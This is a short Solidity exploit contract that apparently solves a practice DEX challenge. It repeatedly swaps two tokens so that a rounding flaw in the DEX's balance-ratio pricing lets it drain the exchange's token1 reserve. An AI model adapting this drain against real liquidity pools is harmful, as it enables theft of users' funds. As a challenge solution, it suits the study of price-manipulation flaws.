// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IDEX {
    function swap(
        address from,
        address to,
        uint256 amount
    ) external;

    function getSwapPrice(
        address from,
        address to,
        uint256 amount
    ) external view returns (uint256);

    function token1() external view returns (address);

    function token2() external view returns (address);
}

contract Hack {
    IDEX private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(address _dex) {
        dex = IDEX(_dex);
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function hack() external {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);
        token1.approve(address(dex), type(uint).max);
        token2.approve(address(dex), type(uint).max);

        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
        _swap(token2, token1);
        _swap(token1, token2);
       dex.swap(address(token2), address(token1), 45);
       require(token1.balanceOf(address(dex)) == 0);
    }

    function _swap(IERC20 tokenIn, IERC20 tokenOut) private {
        dex.swap(
            address(tokenIn),
            address(tokenOut),
            tokenIn.balanceOf(address(this))
        );
    }
}
